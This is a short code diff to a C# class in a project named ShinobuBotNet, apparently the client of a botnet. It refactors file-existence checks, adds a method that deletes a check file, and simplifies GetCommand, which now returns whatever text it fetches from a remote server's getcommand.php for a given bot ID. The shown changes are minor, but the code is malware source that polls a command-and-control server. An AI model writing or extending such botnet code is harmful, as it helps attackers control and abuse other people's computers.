@@ -3,7 +3,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Net;
 using System.Text;
-
+using System.IO;
 namespace ShinobuBotNet
 {
     class API
@@ -27,7 +27,7 @@ namespace ShinobuBotNet
 
         public static string cheak_connect()
         {
-            if (System.IO.File.Exists(config.CheakFile))
+            if (File.Exists(config.CheakFile))
             {
                 return "yes";
             }
@@ -40,21 +40,18 @@ namespace ShinobuBotNet
 
         public static void creat_cheak_File()
         {
-            System.IO.File.Create(config.CheakFile);
+            File.Create(config.CheakFile);
+        }
+
+        public static void delete_check_file()
+        {
+            System.IO.File.Delete(config.CheakFileFull);
         }
 
         public static string GetCommand(string id)
         {
             string html = web.GetHTML(config.server + "getcommand.php?id=" + id);
-            cmd command = new cmd(html);
-            if (command.ComType == null)
-            {
-                return "null";
-            }
-            else
-            {
-                return html;
-            }
+            return html;
         }
 
         public static string GetUsers()
